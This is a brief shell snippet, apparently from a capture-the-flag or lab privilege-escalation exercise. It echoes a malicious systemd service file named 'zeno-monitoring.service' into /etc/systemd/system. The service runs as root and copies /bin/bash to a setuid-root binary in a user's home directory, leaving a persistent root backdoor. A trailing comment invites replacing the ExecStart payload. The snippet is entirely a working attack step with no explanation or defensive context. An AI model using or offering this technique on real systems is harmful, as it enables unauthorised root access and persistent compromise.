#If vim vi and nano editor are not working
echo -e "[unit]\nDescription=Zeno monitoring\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash_root; chmod +xs /home/edward/bash_root'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/zeno-monitoring.service

#ExecStart=<change>
